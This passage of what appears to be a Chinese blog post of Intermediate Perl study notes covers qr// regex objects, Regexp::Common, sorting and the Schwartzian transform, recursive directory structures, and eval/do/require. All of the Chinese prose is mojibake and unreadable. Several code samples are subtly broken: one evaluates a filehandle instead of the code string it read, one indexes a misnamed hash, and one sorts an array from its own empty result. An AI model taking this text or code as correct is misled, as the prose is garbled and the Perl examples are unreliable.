class="hljs-string">&#x27;&#x27;</span> =~ <span class="hljs-regexp">/$pattern/</span> &#125;;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">defined</span> $@ ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ ·ä»ç„¶ä¸å¤ªå¥½.</p><h2 id="9-2-é¢„ç¼–è¯‘æ¨¡å¼"><a href="#9-2-é¢„ç¼–è¯‘æ¨¡å¼" class="headerlink" title="9.2 é¢„ç¼–è¯‘æ¨¡å¼"></a>9.2 é¢„ç¼–è¯‘æ¨¡å¼</h2><p>Perl v5.5 å¼•å…¥ä¸€ä¸ªæ–°çš„å¼•ç”¨æœºåˆ¶: <code>qr//</code> æ“ä½œç¬¦. è¿™é‡Œçš„é¢„ç¼–è¯‘åº”è¯¥æ˜¯è¯´å…¶äº§ç”Ÿçš„å¼•ç”¨ä¼šåœ¨é¢„ç¼–è¯‘æ—¶å±•å¼€.</p><p><code>qr</code> æ˜¯ regex quote.</p><p>æä¾›ä¸€ä¸ªç¼–è¯‘å®Œæˆçš„æ­£åˆ™è¡¨è¾¾å¼çš„å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $regex = <span class="hljs-regexp">qr/Gilligan|Skipper/</span>;<br><span class="hljs-keyword">print</span> $regex;<br></code></pre></td></tr></table></figure><p>åœ¨ perlop æ–‡æ¡£ä¸­å¯æŸ¥çœ‹ â€œå¼•å·å’Œç±»å¼•å·æ“ä½œç¬¦â€.</p><p>åˆ†éš”ç¬¦å¯æ¢ (<code>qr//</code>, æ”¹ä¸º <code>qr()</code> ä¹‹ç±»çš„).</p><p>å¯ä»¥æ·»åŠ  options :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$rex = <span class="hljs-regexp">qr/my.STRING/is</span>;<br></code></pre></td></tr></table></figure><h3 id="9-2-1-æ­£åˆ™è¡¨è¾¾å¼é€‰é¡¹"><a href="#9-2-1-æ­£åˆ™è¡¨è¾¾å¼é€‰é¡¹" class="headerlink" title="9.2.1 æ­£åˆ™è¡¨è¾¾å¼é€‰é¡¹"></a>9.2.1 æ­£åˆ™è¡¨è¾¾å¼é€‰é¡¹</h3><p>ç‰¹æ®Šåºåˆ— <code>(?flags:pattern)</code> å…è®¸åœ¨æ¨¡å¼æœ¬èº«ä¸­æŒ‡å®šä¿®é¥°ç¬¦ (ä¹Ÿå°±æ˜¯è¯´ä¸æŠŠæ ‡å¿—å†™åœ¨æœ«å°¾, è€Œæ˜¯åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¹‹ä¸­):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/(?mi:Gilligan$)/;<br></code></pre></td></tr></table></figure><p>åˆ†ç»„;</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/abc(?i:Gilligan)def/;<br></code></pre></td></tr></table></figure><p>èƒ½å¤Ÿåœ¨æ ‡è®°ä¹‹å‰æ·»åŠ ä¸€ä¸ª â€œ-â€œ, ä»ä¸€éƒ¨åˆ†æ¨¡å¼ä¸­ç§»é™¤ä¿®é¥°ç¬¦:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/abc(?-i:Gilligan)def/i;<br></code></pre></td></tr></table></figure><p>åŒæ—¶æ·»åŠ å’Œç§»é™¤:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">qr/abc(?<span class="hljs-keyword">x</span>-i:G i l l i g a n)def/i;<br></code></pre></td></tr></table></figure><h3 id="9-2-2-åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨"><a href="#9-2-2-åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨" class="headerlink" title="9.2.2 åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨"></a>9.2.2 åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨</h3><p>ç›´æ¥æ’å…¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $regex = <span class="hljs-regexp">qr/Gilligan/</span>;<br>$string =~ <span class="hljs-regexp">m/$regex/</span>;<br>$string =~ <span class="hljs-regexp">s/$regex/Skipper/</span>;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ç»‘å®š:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$string =~ $regex;<br></code></pre></td></tr></table></figure><p>æ™ºèƒ½åŒ¹é…:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$string ~~ $regex;<br></code></pre></td></tr></table></figure><h2 id="9-3-ä½œä¸ºæ ‡é‡çš„æ­£åˆ™è¡¨è¾¾å¼"><a href="#9-3-ä½œä¸ºæ ‡é‡çš„æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="9.3 ä½œä¸ºæ ‡é‡çš„æ­£åˆ™è¡¨è¾¾å¼"></a>9.3 ä½œä¸ºæ ‡é‡çš„æ­£åˆ™è¡¨è¾¾å¼</h2><p>å¯å°†å…¶å­˜å‚¨åœ¨æ•°ç»„å’Œæ•£åˆ—ä¸­, ä½œä¸ºå‚æ•°ä¼ é€’ç»™å­ä¾‹ç¨‹.</p><p>ä½¿ç”¨ List::Util æ¨¡å—ä¸­çš„ <code>first</code> å‡½æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> List::Util <span class="hljs-string">qw(first)</span>;<br><br><span class="hljs-keyword">my</span> %patterns = (<br>    <span class="hljs-string">Gilligan   =&gt;</span> qr/(?:Willie )?Gilligan/,<br>    <span class="hljs-string">&#x27;Mary Ann&#x27;</span> =&gt; <span class="hljs-regexp">qr/Mary Ann/</span>,<br>    <span class="hljs-string">Ginger     =&gt;</span> qr/Ginger/,<br>    <span class="hljs-string">Professor  =&gt;</span> qr/(?:The )?Professor/,<br>    <span class="hljs-string">Skipper    =&gt;</span> qr/Skipper/,<br>    <span class="hljs-string">&#x27;A Howell&#x27;</span> =&gt; <span class="hljs-regexp">qr/Mrs?. Howell/</span>,<br>);<br><br><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;Ginger&#x27;</span>;<br><br><span class="hljs-keyword">my</span>( $match ) = first &#123; $name =~ $pattern&#123;$_&#125; &#125; <span class="hljs-keyword">keys</span> %patterns;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Matched $match&quot;</span> <span class="hljs-keyword">if</span> $match;<br></code></pre></td></tr></table></figure><h2 id="9-4-å»ºç«‹æ­£åˆ™è¡¨è¾¾å¼"><a href="#9-4-å»ºç«‹æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="9.4 å»ºç«‹æ­£åˆ™è¡¨è¾¾å¼"></a>9.4 å»ºç«‹æ­£åˆ™è¡¨è¾¾å¼</h2><p>å°†æ¨¡å¼æ’å…¥å…¶ä»–æ¨¡å¼ä¹‹ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $howells    = <span class="hljs-regexp">qr/Thurston|Mrs/</span>;<br><span class="hljs-keyword">my</span> $tagalongs  = <span class="hljs-regexp">qr/Ginger|Mary Ann/</span>;<br><span class="hljs-keyword">my</span> $passengers = <span class="hljs-regexp">qr/$howells|$tagalongs/</span>;<br><span class="hljs-keyword">my</span> $crew       = <span class="hljs-regexp">qr/Gilligan|Skipper/</span>;<br><br><span class="hljs-keyword">my</span> $everyone   = <span class="hljs-regexp">qr/$crew|$passengers/</span>;<br></code></pre></td></tr></table></figure><h2 id="9-5-åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å—"><a href="#9-5-åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å—" class="headerlink" title="9.5 åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å—"></a>9.5 åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å—</h2><h3 id="9-5-1-ä½¿ç”¨å¸¸è§çš„æ¨¡å¼"><a href="#9-5-1-ä½¿ç”¨å¸¸è§çš„æ¨¡å¼" class="headerlink" title="9.5.1 ä½¿ç”¨å¸¸è§çš„æ¨¡å¼"></a>9.5.1 ä½¿ç”¨å¸¸è§çš„æ¨¡å¼</h3><p>èƒ½å¤Ÿç›´æ¥ä½¿ç”¨ Regexp::Common æ¨¡å—æä¾›çš„æŸä¸ªæ¨¡å¼.</p><p>è¯¥æ¨¡å—å¯¼å‡ºä¸€ä¸ªå«åš <code>$RE</code> çš„æ•£åˆ—å¼•ç”¨, å®ƒä»¥æˆ‘ä»¬æ‰€éœ€è¦çš„æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨ä½œä¸ºå…¶å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> Regexp::Common <span class="hljs-string">qw(URI)</span>;<br><br><span class="hljs-keyword">while</span>( &lt;&gt; ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-keyword">if</span> /$RE<span class="hljs-string">&#123;URL&#125;</span><span class="hljs-string">&#123;HTTP&#125;</span>/;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥æŸ¥æ‰¾ IPv4 åœ°å€, èƒ½å¤Ÿä½¿ç”¨è¯¥æ¨¡å—çš„ net å·¥å…·è¡ç”Ÿå‡ºçš„ä¸€ä¸ªæ¨¡å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> Regexp::Common <span class="hljs-string">qw(net)</span>;<br><br><span class="hljs-keyword">while</span>( &lt;&gt; ) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-keyword">if</span> /$RE<span class="hljs-string">&#123;net&#125;</span><span class="hljs-string">&#123;IPv4&#125;</span>/;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒ¹é…æ•°å­—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10.1</span>;<br><span class="hljs-keyword">use</span> Regexp::Common <span class="hljs-string">qw(number)</span>;<br><br><span class="hljs-keyword">while</span>( &lt;&gt; ) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-keyword">if</span> /$RE<span class="hljs-string">&#123;num&#125;</span><span class="hljs-string">&#123;int&#125;</span>/;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯æŸ¥è¯¢ perltie æ–‡æ¡£, æŸ¥çœ‹å…³äº <code>tie</code> çš„ä¿¡æ¯.</p><p>å…·ä½“çœ‹ä¹¦.</p><h3 id="9-5-2-ç»„è£…æ­£åˆ™è¡¨è¾¾å¼"><a href="#9-5-2-ç»„è£…æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="9.5.2 ç»„è£…æ­£åˆ™è¡¨è¾¾å¼"></a>9.5.2 ç»„è£…æ­£åˆ™è¡¨è¾¾å¼</h3><p>Regexp::Assemble æ¨¡å—å¯ç”¨äºå»ºç«‹é«˜æ•ˆçš„åˆ™ä¸€åŒ¹é….</p><h1 id="ç¬¬10ç« -å®ç”¨çš„å¼•ç”¨æŠ€å·§"><a href="#ç¬¬10ç« -å®ç”¨çš„å¼•ç”¨æŠ€å·§" class="headerlink" title="ç¬¬10ç«  å®ç”¨çš„å¼•ç”¨æŠ€å·§"></a>ç¬¬10ç«  å®ç”¨çš„å¼•ç”¨æŠ€å·§</h1><p>æ³¨æ„ sort å‡½æ•°å¯¹æ•°å­—çš„æ’åº, å…¶ä¼šæŒ‰ç…§å­—ç¬¦ä¸²çš„é¡ºåºè¿›è¡Œæ’åº. å¦‚, ä»»ä½•ä»¥ 3 å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½æ”¾ç½®äº 4 å¼€å¤´çš„å­—ç¬¦ä¸²ä¹‹å‰.</p><p>å‡åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numerically_ascending = <span class="hljs-keyword">sort</span> &#123; $a &lt;=&gt; $b &#125; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">16</span>;<br></code></pre></td></tr></table></figure><p>é™åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numerically_descending = <br>    <span class="hljs-keyword">reverse</span> <span class="hljs-keyword">sort</span> &#123; $a &lt;=&gt; $b &#125; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">32</span>;<br></code></pre></td></tr></table></figure><h2 id="10-2-ç”¨ç´¢å¼•æ’åº"><a href="#10-2-ç”¨ç´¢å¼•æ’åº" class="headerlink" title="10.2 ç”¨ç´¢å¼•æ’åº"></a>10.2 ç”¨ç´¢å¼•æ’åº</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @input = <span class="hljs-string">qw(Gilligan Skipper Professor Ginger Mary Ann)</span>;<br><span class="hljs-keyword">my</span> @sorted_positions = <br>    <span class="hljs-keyword">sort</span> &#123; $input[$a] cmp $input[$b] &#125; <span class="hljs-number">0</span> .. $#input;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;@sorted_positions\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´åˆ©ç”¨ç´¢å¼•æ’åº (<code>$a</code> å’Œ <code>$b</code> çš„å€¼ä¸ºæ•°ç»„çš„ç´¢å¼•), ç»“æœä»ç„¶æ˜¯æŒ‰ç…§ ASCII çš„é¡ºåº.</p><p><code>$#input</code> è¡¨ç¤ºæ•°ç»„çš„æœ€æœ‰ä¸€ä¸ªç´¢å¼•.</p><h2 id="10-3-æ›´ä¸ºé«˜æ•ˆçš„æ’åº"><a href="#10-3-æ›´ä¸ºé«˜æ•ˆçš„æ’åº" class="headerlink" title="10.3 æ›´ä¸ºé«˜æ•ˆçš„æ’åº"></a>10.3 æ›´ä¸ºé«˜æ•ˆçš„æ’åº</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @names_and_pineapples = <span class="hljs-keyword">map</span> &#123;<br>  [ $_, ask_monkey_about($_) ] <br>&#125; @castways;<br><br><span class="hljs-keyword">my</span> @sorted_names_and_pineapples = <span class="hljs-keyword">sort</span> &#123;<br>  $b-&gt;[<span class="hljs-number">1</span>] &lt;=&gt; $a-&gt;[<span class="hljs-number">1</span>];<br>&#125; @sorted_names_and_pineapples;<br></code></pre></td></tr></table></figure><h2 id="10-4-æ–½ç“¦èŒ¨å˜æ¢"><a href="#10-4-æ–½ç“¦èŒ¨å˜æ¢" class="headerlink" title="10.4 æ–½ç“¦èŒ¨å˜æ¢"></a>10.4 æ–½ç“¦èŒ¨å˜æ¢</h2><p>å¦‚è¿™ç§ç»“æ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @names = <br>    <span class="hljs-keyword">map</span> $_-&gt;[<span class="hljs-number">0</span>],<br>    <span class="hljs-keyword">sort</span> &#123; $b-&gt;[<span class="hljs-number">1</span>] &lt;=&gt; $a-&gt;[<span class="hljs-number">1</span>] &#125;<br>    <span class="hljs-keyword">map</span> [ $_, ask_monkey_about($_) ],<br>    @castways;<br></code></pre></td></tr></table></figure><p>åŸºæœ¬è¯­æ³•ç»“æ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @output_data = <br>  <span class="hljs-keyword">map</span>  &#123; EXTRACTION &#125;,<br>  <span class="hljs-keyword">sort</span> &#123; COMPARISON &#125;<br>  <span class="hljs-keyword">map</span>  [ CONSTRUCTION ],<br>  @input_data;<br></code></pre></td></tr></table></figure><h2 id="10-5-ä½¿ç”¨æ–½ç“¦èŒ¨å˜æ¢å®çº¿å¤šçº§æ’åº"><a href="#10-5-ä½¿ç”¨æ–½ç“¦èŒ¨å˜æ¢å®çº¿å¤šçº§æ’åº" class="headerlink" title="10.5 ä½¿ç”¨æ–½ç“¦èŒ¨å˜æ¢å®çº¿å¤šçº§æ’åº"></a>10.5 ä½¿ç”¨æ–½ç“¦èŒ¨å˜æ¢å®çº¿å¤šçº§æ’åº</h2><h2 id="10-6-é€’å½’å®šä¹‰çš„æ•°æ®"><a href="#10-6-é€’å½’å®šä¹‰çš„æ•°æ®" class="headerlink" title="10.6 é€’å½’å®šä¹‰çš„æ•°æ®"></a>10.6 é€’å½’å®šä¹‰çš„æ•°æ®</h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">factorial</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $n = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">if</span> ($n &lt;= <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> $n * factorial($n -<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-7-æ„å»ºé€’å½’å®šä¹‰çš„æ•°æ®"><a href="#10-7-æ„å»ºé€’å½’å®šä¹‰çš„æ•°æ®" class="headerlink" title="10.7 æ„å»ºé€’å½’å®šä¹‰çš„æ•°æ®"></a>10.7 æ„å»ºé€’å½’å®šä¹‰çš„æ•°æ®</h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $skipper_home = &#123;<br>    <span class="hljs-string">&#x27;.cshrc&#x27;</span>                      =&gt; <span class="hljs-keyword">undef</span>,<br>    <span class="hljs-string">&#x27;Please_rescue_us.pdf&#x27;</span>        =&gt; <span class="hljs-keyword">undef</span>,<br>    <span class="hljs-string">&#x27;Things_I_should_have_packed&#x27;</span> =&gt; <span class="hljs-keyword">undef</span>,<br><br>    <span class="hljs-string">bin =&gt;</span> &#123;<br>        <span class="hljs-string">navigate                   =&gt;</span> <span class="hljs-keyword">undef</span>,<br>        <span class="hljs-string">discipline_gilligan        =&gt;</span> <span class="hljs-keyword">undef</span>,<br>        <span class="hljs-string">eat                        =&gt;</span> <span class="hljs-keyword">undef</span>,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>è·å–æ•°æ®å¹¶å½¢æˆç»“æ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">data_for_path</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $path = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">if</span> (-f $path <span class="hljs-keyword">or</span> -l $path) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">undef</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (-d $path) &#123;<br>        <span class="hljs-keyword">my</span> %directory;<br>        <span class="hljs-keyword">opendir</span> PATH, $path <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot opendir $path: $!&quot;</span>;<br>        <span class="hljs-keyword">my</span> @names = <span class="hljs-keyword">readdir</span> PATH;<br>        <span class="hljs-keyword">closedir</span> PATH;<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> $name (@names) &#123;<br>            <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> $name eq <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">or</span> $name eq <span class="hljs-string">&#x27;..&#x27;</span>;<br>            $directory&#123;$name&#125; = data_for_path(<span class="hljs-string">&quot;$path/$name&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> \%directory;<br>    &#125;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;$path is neither a file nor a directory\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">undef</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ç»“æœ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dumper;<br><span class="hljs-keyword">print</span> Dumper(data_for_path(<span class="hljs-string">&#x27;.&#x27;</span>));<br></code></pre></td></tr></table></figure><h2 id="10-8-æ˜¾ç¤ºé€’å½’å®šä¹‰çš„æ•°æ®"><a href="#10-8-æ˜¾ç¤ºé€’å½’å®šä¹‰çš„æ•°æ®" class="headerlink" title="10.8 æ˜¾ç¤ºé€’å½’å®šä¹‰çš„æ•°æ®"></a>10.8 æ˜¾ç¤ºé€’å½’å®šä¹‰çš„æ•°æ®</h2><h2 id="10-9-é¿å…é€’å½’"><a href="#10-9-é¿å…é€’å½’" class="headerlink" title="10.9 é¿å…é€’å½’"></a>10.9 é¿å…é€’å½’</h2><p>ä½¿ç”¨è¿­ä»£è§£å†³é—®é¢˜.</p><h1 id="ç¬¬11ç« -æ„å»ºæ›´å¤§å‹çš„ç¨‹åº"><a href="#ç¬¬11ç« -æ„å»ºæ›´å¤§å‹çš„ç¨‹åº" class="headerlink" title="ç¬¬11ç«  æ„å»ºæ›´å¤§å‹çš„ç¨‹åº"></a>ç¬¬11ç«  æ„å»ºæ›´å¤§å‹çš„ç¨‹åº</h1><h2 id="11-1-ä¿®æ”¹é€šç”¨ä»£ç "><a href="#11-1-ä¿®æ”¹é€šç”¨ä»£ç " class="headerlink" title="11.1 ä¿®æ”¹é€šç”¨ä»£ç "></a>11.1 ä¿®æ”¹é€šç”¨ä»£ç </h2><p>å¤§å¤šæ•°ç”¨ <code>shift</code> æ¥è·å–å‚æ•°.</p><h2 id="11-2-ä½¿ç”¨-eval-æ’å…¥ä»£ç "><a href="#11-2-ä½¿ç”¨-eval-æ’å…¥ä»£ç " class="headerlink" title="11.2 ä½¿ç”¨ eval æ’å…¥ä»£ç "></a>11.2 ä½¿ç”¨ eval æ’å…¥ä»£ç </h2><p>å°†ä»£ç æ”¾å…¥å¦‚ <code>Navigation.pm</code> çš„ç‹¬ç«‹æ–‡ä»¶ä¸­, è¯¥æ–‡ä»¶ç”±æ‰€éœ€çš„å¤šä¸ªå­ä¾‹ç¨‹ç»„æˆ. (<code>.pm</code> å³ Perl Module)</p><p>ç”¨ç¡¬ç¼–ç  (å³ç›´æ¥å°†æ•°æ®å†™åˆ°æºä»£ç ä¸­), ç”¨ <code>eval</code> çš„å­—ç¬¦ä¸²å½¢å¼ (å¯ä»¥ç†è§£ä¸ºå­—ç¬¦ä¸²è¢«å½“ä½œä»£ç ç¼–è¯‘):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">load_common_subroutines</span> </span>&#123;<br>    <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $more_fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;Navigation.pm&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Navigation.pm: $!&quot;</span>;<br>    <span class="hljs-keyword">undef</span> $/;<br>    <span class="hljs-keyword">my</span> $more_code = &lt;$more_fh&gt;;<br>    <span class="hljs-keyword">close</span> $more_fh;<br>    <span class="hljs-keyword">eval</span> $more_fh;<br>    <span class="hljs-keyword">die</span> $@ <span class="hljs-keyword">if</span> $@;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-3-ä½¿ç”¨-do-è¯­å¥"><a href="#11-3-ä½¿ç”¨-do-è¯­å¥" class="headerlink" title="11.3 ä½¿ç”¨ do è¯­å¥"></a>11.3 ä½¿ç”¨ do è¯­å¥</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">do</span> <span class="hljs-string">&#x27;Navigation.pm&#x27;</span>;<br><span class="hljs-keyword">die</span> $@ <span class="hljs-keyword">if</span> $@;<br></code></pre></td></tr></table></figure><p><code>do</code> æ“ä½œç¬¦çš„åŠŸèƒ½å°±åƒæ˜¯æŠŠ <code>Navigation.pm</code> çš„ä»£ç åˆå¹¶è¿›å½“å‰ç¨‹åºä¸­, å°½ç®¡å¯¼å…¥çš„å˜é‡è¿˜åœ¨å®ƒè‡ªå·±çš„ä½œç”¨åŸŸè¯­å¥å—ä¸­. (å³é‡Œé¢æ˜¯å®ƒè‡ªå·±çš„ä½œç”¨åŸŸ, å¦‚ <code>my</code> å’Œ <code>use</code> ä¸ä¼šå’Œä¸»ç¨‹åºå†²çª);</p><h2 id="11-4-ä½¿ç”¨-require-è¯­å¥"><a href="#11-4-ä½¿ç”¨-require-è¯­å¥" class="headerlink" title="11.4 ä½¿ç”¨ require è¯­å¥"></a>11.4 ä½¿ç”¨ require è¯­å¥</h2><p><code>require</code> å¯ä»¥è¿½è¸ªå“ªäº›æ–‡ä»¶å·²ç»å¯¼å…¥, ç„¶åä»…å¯¼å…¥ä¸€æ¬¡.</p><p>ç‰¹æ€§:</p><ul><li>å¯¼å…¥æ–‡ä»¶ä¸­çš„ä»»ä½•è¯­æ³•é”™è¯¯éƒ½å°†ç»ˆæ­¢ç¨‹åº, æ‰€ä»¥ä¸å†éœ€è¦å¾ˆå¤š <code>die $@ if 